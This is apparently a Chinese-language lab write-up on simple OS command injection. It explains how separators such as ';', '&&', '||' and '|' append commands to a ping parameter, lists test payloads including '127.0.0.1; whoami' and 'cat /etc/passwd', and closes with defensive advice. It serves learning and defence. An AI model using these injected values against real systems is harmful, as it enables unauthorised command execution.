# 操作系统命令注入，简单案例

> 官方名：OS command injection, simple case。核心：应用把用户输入直接拼接进系统命令，导致攻击者可以用命令分隔符追加额外命令，实现远程命令执行。

## 知识点：命令注入是什么

命令注入的本质是：

```text
用户输入
    ↓
被后端拼接到系统命令里
    ↓
攻击者追加新的命令
    ↓
系统执行攻击者的命令
```

例如后端代码类似：

```bash
ping -c 1 用户输入
```

如果你输入：

```text
127.0.0.1; whoami
```

最终执行的就是：

```bash
ping -c 1 127.0.0.1; whoami
```

于是：

```text
ping 正常执行
whoami 也被执行
```

---

## 知识点：为什么不能只输入命令

如果只输入：

```text
whoami
```

后端可能是：

```bash
ping -c 1 whoami
```

这时 `whoami` 只是 `ping` 的参数，不会被当成独立命令执行。

所以要做的是：

```text
正常参数 + 命令分隔符 + 新命令
```

例如：

```text
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
```

---

## 常用命令分隔符

| 符号 | 含义 | 示例 |
|------|------|------|
| `;` | 顺序执行下一条命令 | `127.0.0.1; whoami` |
| `&&` | 前一条成功，才执行下一条 | `127.0.0.1 && whoami` |
| `\|\|` | 前一条失败，才执行下一条 | `127.0.0.1 \|\| whoami` |
| `\|` | 管道，把前面的输出交给后面的命令 | `127.0.0.1 \| whoami` |

---

## 常用测试命令

优先用无害命令验证是否有回显：

```text
whoami
id
pwd
ls
uname -a
cat /etc/passwd
```

如果没有直接回显，可以用时间延迟测试：

```text
sleep 10
```

观察响应时间是否明显变长。

---

## 通关过程

1. 找到会把输入带入系统命令的参数
2. 先提交正常值，观察原始响应
3. 在参数后面尝试命令分隔符：
   ```text
   ;
   &&
   ||
   |
   ```
4. 再追加一个有明显输出的命令，例如：
   ```text
   whoami
   ```
5. 如果响应中出现命令输出，说明命令注入成功
6. 按靶场要求执行指定命令，完成实验

## 易错点（我的踩坑）

### 1. 以为直接输入 Linux 命令就能执行

错误理解：

```text
输入：whoami
```

实际可能被当成：

```bash
原命令 whoami
```

正确思路：

```text
正常参数; whoami
```

### 2. 忘记 `;` 后面可以继续执行命令

`;` 的作用是：

```text
结束上一条命令
继续执行下一条命令
```

这是命令注入里最基础的拼接方式。

### 3. 不同分隔符的执行条件不同

```text
;   不管前面是否成功，都执行后面
&&  前面成功才执行后面
||  前面失败才执行后面
|   把前面输出交给后面处理
```

如果 `;` 不行，要继续尝试其他分隔符。

---

## 防御建议

- 不要把用户输入直接拼进系统命令
- 优先使用编程语言自带 API，而不是调用 shell 命令
- 必须执行命令时，使用参数化调用方式
- 对输入使用严格白名单
- 禁止特殊字符：`;`、`&&`、`||`、`|`、`` ` ``、`$()`
- 服务运行权限最小化，避免 root 执行
- 对系统命令执行行为做日志和告警
